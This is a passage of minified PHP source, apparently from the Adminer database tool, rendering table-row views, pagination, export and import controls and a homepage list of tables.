href='".h($_GET["modify"]?remove_from_uri("modify"):$_SERVER["REQUEST_URI"]."&modify=1")."'>".lang(85)."</a>");$ke=array();$Dc=array();reset($K);$qf=1;foreach($J[0]as$w=>$X){if(!isset($Sg[$w])){$X=idx($_GET["columns"],key($K))?:array();$l=$m[$K?($X?$X["col"]:current($K)):$w];$_=($l?adminer()->fieldName($l,$qf):($X["fun"]?"*":h($w)));if($_!=""){$qf++;$ke[$w]=$_;$d=idf_escape($w);$Xc=remove_from_uri('(order|desc)[^=]*|page').'&order%5B0%5D='.urlencode($w);$zb="&desc%5B0%5D=1";echo"<th id='th[".h(bracket_escape($w))."]'>".script("mixin(qsl('th'), {onmouseover: partial(columnMouse), onmouseout: partial(columnMouse, ' hidden')});","");$Cc=apply_sql_function($X["fun"],$_);$Uf=isset($l["privileges"]["order"])||$Cc;echo($Uf?"<a href='".h($Xc.($Ce[0]==$d||$Ce[0]==$w||(!$Ce&&$td&&$Gc[0]==$d)?$zb:''))."'>$Cc</a>":$Cc),"<span class='column hidden'>";if($Uf)echo"<a href='".h($Xc.$zb)."' title='".lang(86)."' class='text'> ↓</a>";if(!$X["fun"]&&isset($l["privileges"]["where"]))echo'<a href="#fieldset-search" title="'.lang(42).'" class="text jsonly"> =</a>',script("qsl('a').onclick = partial(selectSearch, '".js_escape($w)."');");echo"</span>";}$Dc[$w]=$X["fun"];next($K);}}$Jd=array();if($_GET["modify"]){foreach($J
as$I){foreach($I
as$w=>$X)$Jd[$w]=max($Jd[$w],min(40,strlen(utf8_decode($X))));}}echo($za?"<th>".lang(87):"")."</thead>\n";if(is_ajax())ob_end_clean();foreach(adminer()->rowDescriptions($J,$zc)as$ie=>$I){$Pg=unique_array($J[$ie],$v);if(!$Pg){$Pg=array();reset($K);foreach($J[$ie]as$w=>$X){if(!preg_match('~^(COUNT|AVG|GROUP_CONCAT|MAX|MIN|SUM)\(~',current($K)))$Pg[$w]=$X;next($K);}}$Qg="";foreach($Pg
as$w=>$X){$l=(array)$m[$w];if((JUSH=="sql"||JUSH=="pgsql")&&preg_match('~char|text|enum|set~',$l["type"])&&strlen($X)>64){$w=(strpos($w,'(')?$w:idf_escape($w));$w="MD5(".(JUSH!='sql'||preg_match("~^utf8~",$l["collation"])?$w:"CONVERT($w USING ".charset(connection()).")").")";$X=md5($X);}$Qg
.="&".($X!==null?urlencode("where[".bracket_escape($w)."]")."=".urlencode($X===false?"f":$X):"null%5B%5D=".urlencode($w));}echo"<tr>".(!$Gc&&$K?"":"<td>".checkbox("check[]",substr($Qg,1),in_array(substr($Qg,1),(array)$_POST["check"])).($td||information_schema(DB)?"":" <a href='".h(ME."edit=".urlencode($a).$Qg)."' class='edit'>".lang(88)."</a>"));reset($K);foreach($I
as$w=>$X){if(isset($ke[$w])){$d=current($K);$l=(array)$m[$w];$X=driver()->value($X,$l);if($X!=""&&(!isset($Qb[$w])||$Qb[$w]!=""))$Qb[$w]=(is_mail($X)?$ke[$w]:"");$y="";if(preg_match('~blob|bytea|raw|file~',$l["type"])&&$X!="")$y=ME.'download='.urlencode($a).'&field='.urlencode($w).$Qg;if(!$y&&$X!==null){foreach((array)$zc[$w]as$o){if(count($zc[$w])==1||end($o["source"])==$w){$y="";foreach($o["source"]as$r=>$Vf)$y
.=where_link($r,$o["target"][$r],$J[$ie][$Vf]);$y=($o["db"]!=""?preg_replace('~([?&]db=)[^&]+~','\1'.urlencode($o["db"]),ME):ME).'select='.urlencode($o["table"]).$y;if($o["ns"])$y=preg_replace('~([?&]ns=)[^&]+~','\1'.urlencode($o["ns"]),$y);if(count($o["source"])==1)break;}}}if($d=="COUNT(*)"){$y=ME."select=".urlencode($a);$r=0;foreach((array)$_GET["where"]as$W){if(!array_key_exists($W["col"],$Pg))$y
.=where_link($r++,$W["col"],$W["val"],$W["op"]);}foreach($Pg
as$yd=>$W)$y
.=where_link($r++,$yd,$W);}$Yc=select_value($X,$y,$l,$qg);$s=h("val[$Qg][".bracket_escape($w)."]");$df=idx(idx($_POST["val"],$Qg),bracket_escape($w));$Mb=!is_array($I[$w])&&is_utf8($Yc)&&$J[$ie][$w]==$I[$w]&&!$Dc[$w]&&!$l["generated"];$U=(preg_match('~^(AVG|MIN|MAX)\((.+)\)~',$d,$z)?$m[idf_unescape($z[2])]["type"]:$l["type"]);$og=preg_match('~text|json|lob~',$U);$ud=preg_match(number_type(),$U)||preg_match('~^(CHAR_LENGTH|ROUND|FLOOR|CEIL|TIME_TO_SEC|COUNT|SUM)\(~',$d);echo"<td id='$s'".($ud&&($X===null||is_numeric(strip_tags($Yc))||$U=="money")?" class='number'":"");if(($_GET["modify"]&&$Mb&&$X!==null)||$df!==null){$Kc=h($df!==null?$df:$I[$w]);echo">".($og?"<textarea name='$s' cols='30' rows='".(substr_count($I[$w],"\n")+1)."'>$Kc</textarea>":"<input name='$s' value='$Kc' size='$Jd[$w]'>");}else{$Od=strpos($Yc,"<i>…</i>");echo" data-text='".($Od?2:($og?1:0))."'".($Mb?"":" data-warning='".h(lang(89))."'").">$Yc";}}next($K);}if($za)echo"<td>";adminer()->backwardKeysPrint($za,$J[$ie]);echo"</tr>\n";}if(is_ajax())exit;echo"</table>\n","</div>\n";}if(!is_ajax()){if($J||$C){$bc=true;if($_GET["page"]!="last"){if(!$x||(count($J)<$x&&($J||!$C)))$Ac=($C?$C*$x:0)+count($J);elseif(JUSH!="sql"||!$td){$Ac=($td?false:found_rows($S,$Z));if(intval($Ac)<max(1e4,2*($C+1)*$x))$Ac=first(slow_query(count_rows($a,$Z,$td,$Gc)));else$bc=false;}}$Me=($x&&($Ac===false||$Ac>$x||$C));if($Me)echo(($Ac===false?count($J)+1:$Ac-$C*$x)>$x?'<p><a href="'.h(remove_from_uri("page")."&page=".($C+1)).'" class="loadmore">'.lang(90).'</a>'.script("qsl('a').onclick = partial(selectLoadMore, $x, '".lang(91)."…');",""):''),"\n";echo"<div class='footer'><div>\n";if($Me){$Vd=($Ac===false?$C+(count($J)>=$x?2:1):floor(($Ac-1)/$x));echo"<fieldset>";if(JUSH!="simpledb"){echo"<legend><a href='".h(remove_from_uri("page"))."'>".lang(92)."</a></legend>",script("qsl('a').onclick = function () { pageClick(this.href, +prompt('".lang(92)."', '".($C+1)."')); return false; };"),pagination(0,$C).($C>5?" …":"");for($r=max(1,$C-4);$r<min($Vd,$C+5);$r++)echo
pagination($r,$C);if($Vd>0)echo($C+5<$Vd?" …":""),($bc&&$Ac!==false?pagination($Vd,$C):" <a href='".h(remove_from_uri("page")."&page=last")."' title='~$Vd'>".lang(93)."</a>");}else
echo"<legend>".lang(92)."</legend>",pagination(0,$C).($C>1?" …":""),($C?pagination($C,$C):""),($Vd>$C?pagination($C+1,$C).($Vd>$C+1?" …":""):"");echo"</fieldset>\n";}echo"<fieldset>","<legend>".lang(94)."</legend>";$Db=($bc?"":"~ ").$Ac;$xe="const checked = formChecked(this, /check/); selectCount('selected', this.checked ? '$Db' : checked); selectCount('selected2', this.checked || !checked ? '$Db' : checked);";echo
checkbox("all",1,0,($Ac!==false?($bc?"":"~ ").lang(95,$Ac):""),$xe)."\n","</fieldset>\n";if(adminer()->selectCommandPrint())echo'<fieldset',($_GET["modify"]?'':' class="jsonly"'),'><legend>',lang(85),'</legend><div>
<input type="submit" value="',lang(14),'"',($_GET["modify"]?'':' title="'.lang(81).'"'),'>
</div></fieldset>
<fieldset><legend>',lang(96),' <span id="selected"></span></legend><div>
<input type="submit" name="edit" value="',lang(10),'">
<input type="submit" name="clone" value="',lang(97),'">
<input type="submit" name="delete" value="',lang(18),'">',confirm(),'</div></fieldset>
';$_c=adminer()->dumpFormat();foreach((array)$_GET["columns"]as$d){if($d["fun"]){unset($_c['sql']);break;}}if($_c){print_fieldset("export",lang(98)." <span id='selected2'></span>");$Je=adminer()->dumpOutput();echo($Je?html_select("output",$Je,$ha["output"])." ":""),html_select("format",$_c,$ha["format"])," <input type='submit' name='export' value='".lang(98)."'>\n","</div></fieldset>\n";}adminer()->selectEmailPrint(array_filter($Qb,'strlen'),$e);echo"</div></div>\n";}if(adminer()->selectImportPrint())echo"<p>","<a href='#import'>".lang(99)."</a>",script("qsl('a').onclick = partial(toggle, 'import');",""),"<span id='import'".($_POST["import"]?"":" class='hidden'").">: ","<input type='file' name='csv_file'> ",html_select("separator",array("csv"=>"CSV,","csv;"=>"CSV;","tsv"=>"TSV"),$ha["format"])," <input type='submit' name='import' value='".lang(99)."'>","</span>";echo
input_token(),"</form>\n",(!$Gc&&$K?"":script("tableCheck();"));}}}if(is_ajax()){ob_end_clean();exit;}}elseif(isset($_GET["script"])){if($_GET["script"]=="kill")connection()->query("KILL ".number($_POST["kill"]));elseif(list($R,$s,$_)=adminer()->_foreignColumn(column_foreign_keys($_GET["source"]),$_GET["field"])){$x=11;$G=connection()->query("SELECT $s, $_ FROM ".table($R)." WHERE ".(preg_match('~^[0-9]+$~',$_GET["value"])?"$s = $_GET[value] OR ":"")."$_ LIKE ".q("$_GET[value]%")." ORDER BY 2 LIMIT $x");for($r=1;($I=$G->fetch_row())&&$r<$x;$r++)echo"<a href='".h(ME."edit=".urlencode($R)."&where".urlencode("[".bracket_escape(idf_unescape($s))."]")."=".urlencode($I[0]))."'>".h($I[1])."</a><br>\n";if($I)echo"...\n";}exit;}else{page_header(lang(58),"",false);if(adminer()->homepage()){echo"<form action='' method='post'>\n","<p>".lang(100).": <input type='search' name='query' value='".h($_POST["query"])."'> <input type='submit' value='".lang(42)."'>\n";if($_POST["query"]!="")search_tables();echo"<div class='scrollable'>\n","<table class='nowrap checkable odds'>\n",script("mixin(qsl('table'), {onclick: tableClick, ondblclick: partialArg(tableClick, true)});"),'<thead><tr class="wrap">','<td><input id="check-all" type="checkbox" class="jsonly">'.script("qs('#check-all').onclick = partial(formCheck, /^tables\[/);",""),'<th>'.lang(101),'<td>'.lang(102),"</thead>\n";foreach(table_status()as$R=>$I){$_=adminer()->tableName($I);if($_!=""){echo'<tr><td>'.checkbox("tables[]",$R,in_array($R,(array)$_POST["tables"],true)),"<th><a href='".h(ME).'select='.urlencode($R)."'>$_</a>";$X=format_number($I["Rows"]);echo"<td align='right'><a href='".h(ME."edit=").urlencode($R)."'>".($I["Engine"]=="InnoDB"&&$X?"~ $X":$X)."</a>";}}echo"</table>\n","</div>\n","</form>\n",script("tableCheck();");adminer()->pluginsLinks();}}page_footer();